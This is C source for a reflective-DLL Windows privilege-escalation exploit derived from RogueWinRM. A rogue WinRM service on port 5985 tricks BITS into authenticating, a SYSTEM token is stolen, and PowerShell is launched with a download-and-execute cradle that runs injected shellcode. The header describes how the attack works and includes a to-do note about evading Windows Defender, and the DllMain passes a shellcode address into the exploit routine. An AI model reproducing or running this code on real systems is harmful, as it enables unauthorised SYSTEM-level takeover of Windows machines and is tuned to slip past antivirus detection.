/*
This is an escalation privilege exploit which launch an arbitrary process as SYSTEM user.
It takes advantage of the BITS behavior which always try to connect on port 5985 (Windows
Remote Management) even if there is no WinRM service listening on that port. This exploit
launch a rogue WinRM service which force BITS service to authenticate by sending it a 401
challenge response packet. The authentication allows to steal a SYSTEM token as a primary
token, and use it to launch an arbitrary process as SYSTEM.

In practice, this exploit launch powershell.exe as SYSTEM with the following command line:
iex(New-Object Net.WebClient).DownloadString('http://127.0.0.1')
Internally, the exploit generate an evil powershell script which execute arbitrary shellcode.
A separate thread launches a http service listening on port 80 and is in charge of serving
this malicious powershell script.

Details of the vulnerability here :
https://decoder.cloud/2019/12/06/we-thought-they-were-potatoes-but-they-were-beans/

This exploit was developed from decoder's POC here:
https://github.com/antonioCoco/RogueWinRM

PREREQUISITES/
- Port 5985 must be free
- BITS must not be running

WARNING:
- As this exploit launches 2 services, a firewall popup may appear
- A powershell windows flashes on the screen. Thus, this exploit is not completely silent.

TODO:
- Find better powershell script as the current one is flagged by Windows Defender (Behavior)
*/

#include "ReflectiveLoader.c"
#include "../Common_Src_Files/pch.h"

// Note: REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR and REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN are
// defined in the project properties (Properties->C++->Preprocessor) so as we can specify our own 
// DllMain and use the LoadRemoteLibraryR() API to inject this DLL.

//===============================================================================================//
extern HINSTANCE hAppInstance;

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
	BOOL debug = TRUE;
	int exit_status = -1;
	BOOL bReturnValue = TRUE;
	char* shellcode_address = (LPSTR)lpReserved;

	switch (dwReason)
	{
	case DLL_QUERY_HMODULE:
		hAppInstance = hinstDLL;
		if (lpReserved != NULL)
			*(HMODULE*)lpReserved = hAppInstance;
		break;
	case DLL_PROCESS_ATTACH:
		hAppInstance = hinstDLL;

		exit_status = RunRogueWinRM(shellcode_address, debug);
		dprintf("Exit status: %d", exit_status);
		ExitProcess(exit_status);
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return bReturnValue;
}
